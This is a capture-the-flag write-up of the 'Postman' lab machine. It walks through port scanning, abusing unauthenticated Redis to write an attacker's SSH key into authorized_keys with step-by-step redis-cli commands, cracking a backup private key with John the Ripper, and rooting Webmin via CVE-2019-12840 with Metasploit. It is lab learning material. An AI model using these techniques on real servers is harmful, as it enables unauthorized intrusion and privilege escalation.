# Summary
The following ports were discovered to be open by a Nmap scan: 22, 80, 6379, and 10000.

10000, the standard port for running Webmin, a management control panel, was the port of interest. The Redis service, which was running on port 6379, is what gave me an initial foothold.

Redis is an open-source data structure tool that can be used as a cache, message broker, or distributed in-memory database. Redis shouldn't be publicly accessible to the internet since, if improperly configured, an attack could utilize SSH to connect straight into the victim server. This is the method I used to gain an initial foothold.

I was able to generate my own public-private key, write that key to a file, and then import that key into redis. While logged into redis, you can save that public key to **authorized_keys** file on the server. Finally, using that generated private key, SSH into the redis server.
 Post enumeration, a user named Matt was found, and this user created an id_rsa.bak file which contained his readable private SSH key. I took that key offline and cracked it with ssh2john and John the Ripper. Because Matt reuses his passwords, I was able to log into Webmin with his credentials. 

The running version of Webmin in this box is vulnerable to CVE-2019-12840, which any user authorized to the "Package Updates" module can execute arbitrary commands with root privileges via the data parameter to update.cgi. I used a module in Metasploit to execute this and root the box.

## Nmap
```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   syn-ack ttl 63 Redis key-value store 4.0.9
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

## Information Gathering
### Port 80
Port 80 (Apache httpd 2.4.29) is open displaying this webpage below.

![Pasted image 20220715151825](https://user-images.githubusercontent.com/55252902/179373833-dc5e676c-73aa-4296-97c7-7cd9db6484ff.png)

### Port 10000
Port 10000 is the default port for Webmin (MiniServ 1.910) , a web-based interface for system adminsitration for Unix. Navigating to that port gives me this page...

![Pasted image 20220715152050](https://user-images.githubusercontent.com/55252902/179373838-b8a9037c-f376-418e-8fb2-81ab09d96b92.png)

I will have to edit my /etc/hosts to file to include 10.10.10.160 - postman to be able to navigate to this page. This will take me to the login portal for Webmin.

![Pasted image 20220715152203](https://user-images.githubusercontent.com/55252902/179373843-d62f58b4-61d2-4c9d-a60f-92782119af95.png)

### Port 6379
This port runs the redis service, which I will need to learn more about since I am not very familiar with it. Hacktrickz is my go-to resource when I need to research things regarding penetration testing (https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis). I've always found this site to be reliable and helpful.

But for this box, the initial foothold will be through Redis and escalating from there. You can get RCE through Redis from SSH. To interact with Redis you can use Redis CLI.

To connect to the service

```bash
redis-cli -h 10.10.10.160
```

![Pasted image 20220715153813](https://user-images.githubusercontent.com/55252902/179373855-6b245e0c-ca35-4499-a8d3-2cebc32cdbf6.png)

The Redis service on this box is misconfigured to allow for unauthorized access and write permissions.

## Exploitation
I will need to generate an ssh public-private key on my machine.

```bash 
ssh-keygen -t rsa
```

![Pasted image 20220715153959](https://user-images.githubusercontent.com/55252902/179373866-0debdeae-1b6f-4bc6-a8a1-d6313b8ec6d3.png)

Next is to write the public key to a file 

```bash
(echo -e "\n\n"; cat ~/postman.pub; echo -e "\n\n") > key.txt
```
Or you can do this manually by adding two newlines to the top of the file and at the bottom and then saving out to a new text file.

![Pasted image 20220715154416](https://user-images.githubusercontent.com/55252902/179373890-bebd86e0-c530-44da-aacb-09145d17f9ab.png)

Now I will need to import the file into redis

```bash
cat postman.txt | redis-cli -h 10.10.10.160 -x set ssh_key
```

![Pasted image 20220715154620](https://user-images.githubusercontent.com/55252902/179373895-da954024-135d-4fac-a535-c62f60cbfad3.png)


Now back in Redis to run these commands...

```bash
config set dir /var/lib/redis/.ssh
```

```bash
config set dbfilename "authorized_keys"
```

```bash
save
```

![Pasted image 20220715154829](https://user-images.githubusercontent.com/55252902/179373911-4c94cbbf-9bdf-4c2b-ac53-bc034b289d08.png)

Now SSH into the Redis server with the private key

```bash
ssh -i postman redis@10.10.10.160
```

![Pasted image 20220715155119](https://user-images.githubusercontent.com/55252902/179373918-27c2b264-8ded-4221-a456-868b1005ba60.png)

The user.txt file located in /home/matt, unable to cat the file out. Will need escalate privileges to Matt.

There is too much to shift through to figure out a route for privilege escalation, so I am going to download [Linpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20220710) into this machine.

![Uploading Pasted image 20220715160456.png…]()


![Pasted image 20220715160538](https://user-images.githubusercontent.com/55252902/179373929-ed8be361-d66d-4409-a7d0-3816026e8d46.png)

![Pasted image 20220715160754](https://user-images.githubusercontent.com/55252902/179373931-3558c3c3-2a62-4574-8d74-3b6808b0a5e9.png)

Matt created a backup of a private SSH Key in /opt/ and we are able to read it.

![Pasted image 20220715161228](https://user-images.githubusercontent.com/55252902/179373937-0b882ef8-a380-42bb-8ca2-bdc2fc9555de.png)

![Pasted image 20220715161351](https://user-images.githubusercontent.com/55252902/179373940-c6d1f86d-4eec-48d7-b986-5faa8da2fb53.png)

I am going to take this offline on my machine and crack it with John the Ripper.

### Cracking the hash offline
I kept getting this error when trying to use ssh2john, perhaps because at the time of doing this box I didn't have the latest version.

![Pasted image 20220716160313](https://user-images.githubusercontent.com/55252902/179373951-c819a16d-5e5f-4efa-9754-4be31bc9fad3.png)

But a quick google search from this [stackoverflow thread](https://stackoverflow.com/questions/69187685/getting-attributeerror-module-base64-has-no-attribute-decodestring-error-wh) solves the issue.  The function `decodestring()` is depreciated in python v3.9, instead you have to use [base64.decodebytes()](https://docs.python.org/3.9/library/base64.html#base64.decodebytes).

Now it works and I can crack it with John, going to crack it with the rockyou wordlist.

ssh2john postman.ssh.tx

![Pasted image 20220716160414](https://user-images.githubusercontent.com/55252902/179373978-3a25b158-8261-4c39-92c9-baa6af19ad8a.png)

![Pasted image 20220716161615](https://user-images.githubusercontent.com/55252902/179373981-6d3babb8-e24e-4e9a-aa61-0e75a7350ea1.png)

### Matt

Matt reuses passwords so I was able to log into Webmin with Matt's credentials.

![Pasted image 20220716162941](https://user-images.githubusercontent.com/55252902/179374005-bb75e6ec-afc1-4fd6-9c76-9e0320f5de92.png)

The Webmin version is 1.910 which has an authenticated RCE vulnerability - [CVE-2019-12840](https://nvd.nist.gov/vuln/detail/CVE-2019-12840)
I will be using Metasploit for this

![Pasted image 20220716163909](https://user-images.githubusercontent.com/55252902/179374012-1584b820-3281-4785-9da7-b7bb2e8a1c67.png)

Module options set...

![Pasted image 20220716164348](https://user-images.githubusercontent.com/55252902/179374023-c6733565-d726-44f3-8818-b365b826b003.png)

It wasn't working initially but I forgot to set SSL to true.

![Pasted image 20220716164624](https://user-images.githubusercontent.com/55252902/179374031-f0e608d8-dcd1-4e64-875c-ae97f59d2405.png)

![Pasted image 20220716164652](https://user-images.githubusercontent.com/55252902/179374036-303b173f-185f-4f76-83ab-d79ebda638b5.png)

### CVE-2019-12840
In Webmin through 1.910, any user authorized to the "Package Updates" module can execute arbitrary commands with root privileges via the data parameter to update.cgi. 

[Proof of Concept](https://github.com/KrE80r/webmin_cve-2019-12840_poc/blob/master/CVE-2019-12840.py)

The exploit will log into Webmin with the provided credentials and fetch cookies.

![Pasted image 20220716165904](https://user-images.githubusercontent.com/55252902/179374047-a21b9f35-ee54-4634-a6f5-560166c4ce41.png)

Then the base64 encoded payload is then sent and executed at the referer url which is upgate.cgi with the feteched cookies and following headers. Payload generates a reverse TCP shell.

![Pasted image 20220716170358](https://user-images.githubusercontent.com/55252902/179374060-44b3ee05-4a28-4996-98e9-4c98ab6f5da7.png)

# Resources
[hacktricks 6379 - Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce)

[Speedguide port 6379 details](https://www.speedguide.net/port.php?port=6739)

[Github - linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20220710)

[Redcis CLI documentation](https://redis.io/docs/manual/cli/)

[CVE-2019-12840](https://nvd.nist.gov/vuln/detail/CVE-2019-12840)

[CVE-2019-12840 PoC](https://github.com/KrE80r/webmin_cve-2019-12840_poc/blob/master/CVE-2019-12840.py)




